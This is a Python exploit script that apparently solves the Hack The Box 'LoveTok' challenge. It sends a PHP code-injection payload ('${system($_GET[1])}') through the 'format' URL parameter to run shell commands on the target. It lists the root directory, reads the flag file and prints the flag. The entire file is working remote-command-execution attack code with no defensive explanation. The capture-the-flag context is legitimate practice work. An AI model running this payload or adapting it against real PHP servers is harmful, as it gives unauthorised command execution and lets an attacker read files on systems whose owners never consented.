import requests
import argparse
import re

parser = argparse.ArgumentParser()
parser.add_argument('--host', type=str, required=True)
args = parser.parse_args()

def validate_host():
    r = requests.get(f'http://{args.host}')
    if r.text.find('<b>LoveTok</b>') == -1:
        print(f'\tThe HOST {args.host} is not valid')
        exit(1)

def extract(payload):
    r = requests.get(f'http://{args.host}/?format=${{system($_GET[1])}}&1={payload}')
    return r.text

def main():
    validate_host()
    result_ls = extract('ls+/')
    flag_file_name = re.findall(r'flag(.+?)\n', result_ls)
    result_cat = extract(f'cat+/flag{flag_file_name[0]}')
    flag = re.findall(r'{(.+?)}', result_cat)
    print(f'\t🏁 The FLAG is HTB{{{flag[0]}}}')
    exit(0)         

main()